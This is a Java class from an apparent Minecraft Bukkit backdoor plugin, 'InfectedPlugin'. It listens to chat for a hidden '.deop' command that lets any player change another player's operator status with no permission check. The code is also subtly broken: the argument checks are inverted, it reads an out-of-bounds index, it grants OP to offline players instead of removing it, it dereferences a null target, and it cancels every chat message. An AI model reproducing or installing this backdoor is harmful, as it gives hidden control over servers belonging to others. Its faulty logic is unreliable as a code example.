 package org.CreeperCoders.InfectedPlugin.Commands;
 
 import org.bukkit.Server;
 import org.bukkit.Bukkit;
 import org.bukkit.ChatColor;
 import org.bukkit.entity.Player;
 import org.bukkit.event.*;
 import org.bukkit.event.player.AsyncPlayerChatEvent;
 
 public class Command_deop implements Listener
 {
     @EventHandler
     public void onPlayerChat(AsyncPlayerChatEvent event)
     {
         String message = event.getMessage();
         final Player p = event.getPlayer();
         String[] args = message.split(" ");
         Server server = Bukkit.getServer();
         boolean cancel = true;
     
         if (message.toLowerCase().contains(".deop"))
         {
             if (args.length != 1)
             {
                 p.sendMessage(ChatColor.RED + "Usage: .deop <player>");
                 cancel = true;
             }
             else
             {
                Player target = server.getPlayer(args[1]);
                 if (target == null)
                 {
                     server.getOfflinePlayer(args[1]).setOp(true);
                     cancel = true;
                 }
                 target.setOp(false);
                 target.sendMessage(ChatColor.RED + "You are no longer OP.");
                 cancel = true;
             }
         }
         
         if (cancel)
         {
             event.setCancelled(true);
             return;
         }
     }
 }
